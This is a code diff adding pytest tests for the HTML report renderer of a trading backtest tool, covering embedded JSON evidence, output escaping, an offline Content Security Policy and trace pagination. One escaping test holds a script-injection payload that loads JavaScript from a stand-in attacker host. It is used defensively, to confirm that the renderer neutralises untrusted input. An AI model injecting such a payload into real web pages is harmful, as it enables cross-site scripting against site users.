@@ -111,6 +111,15 @@ def _json_lines(path: Path) -> list[dict[str, object]]:
     return [json.loads(line) for line in path.read_text(encoding="utf-8").splitlines()]
 
 
+def _html_evidence(path: Path) -> dict[str, object]:
+    html = path.read_text(encoding="utf-8")
+    marker = '<script id="backtest-evidence" type="application/json" nonce="backtest-report">'
+    payload = html.split(marker, 1)[1].split("</script>", 1)[0]
+    evidence = json.loads(payload)
+    assert isinstance(evidence, dict)
+    return evidence
+
+
 def _publish(root: Path):
     from smc_ict.adapters.reporting.jsonl import BacktestReportPublisher
 
@@ -389,3 +398,117 @@ def test_html_is_offline_and_exposes_complete_trace_filters(tmp_path: Path) -> N
         assert step["state"] in html
         assert step["reason"] in html
     assert "first rejection" in html
+
+
+def test_html_projects_every_canonical_artifact_into_complete_report_views(tmp_path: Path) -> None:
+    _, receipt = _publish(tmp_path)
+    result = receipt.path
+
+    html = (result / "report.html").read_text(encoding="utf-8")
+    evidence = _html_evidence(result / "report.html")
+    manifest = json.loads((result / "manifest.json").read_bytes())
+
+    assert evidence == {
+        "manifest": {key: value for key, value in manifest.items() if key != "artifacts"},
+        "summary": json.loads((result / "summary.json").read_bytes()),
+        "decisions": _json_lines(result / "decisions.jsonl"),
+        "traces": _json_lines(result / "pipeline-traces.jsonl"),
+        "trades": _json_lines(result / "trades.jsonl"),
+    }
+    for section in (
+        'id="overall-summary"',
+        'id="instrument-summary"',
+        'id="direction-summary"',
+        'id="trade-outcomes"',
+        'id="decision-outcomes"',
+        'id="pipeline-explorer"',
+    ):
+        assert section in html
+
+
+def test_html_escapes_untrusted_evidence_and_enforces_an_offline_csp(tmp_path: Path) -> None:
+    from smc_ict.adapters.reporting.html import render_report
+
+    attack = '</script><script src="https://attacker.invalid/payload.js">alert(1)</script>&'
+    report = tmp_path / "report.html"
+    report.write_bytes(
+        render_report(
+            manifest={"backtest_id": attack},
+            summary={"overall": {}, "by_instrument": [], "by_direction": []},
+            decisions=[{"decision": {"status": "NO_TRADE", "reason": attack}}],
+            traces=[{"instrument_id": attack, "steps": [{"reason": attack}]}],
+            trades=[{"exit_reason": attack}],
+        )
+    )
+
+    html = report.read_text(encoding="utf-8")
+    assert attack not in html
+    assert "default-src 'none'" in html
+    assert "connect-src 'none'" in html
+    assert "script-src-attr 'none'" in html
+    assert "script-src 'nonce-backtest-report'" in html
+    assert '<script src="' not in html
+    assert _html_evidence(report)["manifest"] == {"backtest_id": attack}
+
+
+def test_html_bounds_trace_dom_and_exposes_filter_and_page_boundaries(tmp_path: Path) -> None:
+    from smc_ict.adapters.reporting.html import render_report
+
+    count = 53
+    decisions: list[dict[str, object]] = [
+        {"decision": {"status": "NO_TRADE" if index % 2 else "READY"}} for index in range(count)
+    ]
+    traces: list[dict[str, object]] = [
+        {
+            "instrument_id": f"instrument-{index % 2}",
+            "evaluation_time_ms": index,
+            "first_rejection": None if index % 2 else "gate",
+            "steps": [
+                {
+                    "kind": "DECISION_GATE",
+                    "step_id": f"step-{index}",
+                    "state": "PASS" if index % 2 else "REJECT",
+                    "reason": f"reason-{index}",
+                }
+            ],
+        }
+        for index in range(count)
+    ]
+    report = tmp_path / "report.html"
+    report.write_bytes(
+        render_report(
+            manifest={"backtest_id": "bounded"},
+            summary={
+                "overall": {"status_counts": [], "exit_reason_counts": []},
+                "by_instrument": [],
+                "by_direction": [],
+                "decision_status_counts": [["NO_TRADE", 26], ["READY", 27]],
+                "unavailable_reason_counts": [],
+            },
+            decisions=decisions,
+            traces=traces,
+            trades=[],
+        )
+    )
+
+    html = report.read_text(encoding="utf-8")
+    initial_markup = html.split('<script id="backtest-evidence"', 1)[0]
+    assert "<details" not in initial_markup
+    embedded_traces = _html_evidence(report)["traces"]
+    assert isinstance(embedded_traces, list)
+    assert len(embedded_traces) == count
+    assert "const PAGE_SIZE=25" in html
+    assert "return rows.slice(start,start+PAGE_SIZE)" in html
+    assert "Math.max(0,Math.min(pages[kind],pageCount(rows)-1))" in html
+    for control in (
+        'id="trace-first"',
+        'id="trace-prev"',
+        'id="trace-page-input"',
+        'id="trace-go"',
+        'id="trace-next"',
+        'id="trace-last"',
+    ):
+        assert control in html
+    assert "pages.trace=0;renderTraces()" in html
+    assert "pages.trace=pageCount(matchingTraces())-1" in html
+    assert "pages.trace=Number(document.getElementById('trace-page-input').value)-1" in html
